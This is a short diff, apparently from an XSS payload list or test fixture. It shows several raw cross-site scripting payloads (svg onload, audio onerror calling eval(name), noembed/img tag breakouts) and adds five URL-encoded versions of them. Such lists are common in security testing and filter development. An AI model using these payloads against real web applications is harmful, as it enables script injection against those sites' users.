@@ -3,3 +3,8 @@
 <xss onmousemove=alert(1) style=display:block>test</xss>
 <audio/src/onerror=eval(name)>
 <noembed><img title=\"</noembed><img src onerror=alert(1)>\"></noembed>
+%3Csvg%3E%3Canimate%20onend%3Dconsole.log(1)%20attributeName%3Dx%20dur%3D1s%3E
+%3Csvg%2Fonload%3Dalert%601%60%3E
+%3Cxss%20onmousemove%3Dalert(1)%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E
+%3Caudio%2Fsrc%2Fonerror%3Deval(name)%3E
+%3Cnoembed%3E%3Cimg%20title%3D%22%3C%2Fnoembed%3E%3Cimg%20src%20onerror%3Dalert(1)%3E%22%3E%3C%2Fnoembed%3E
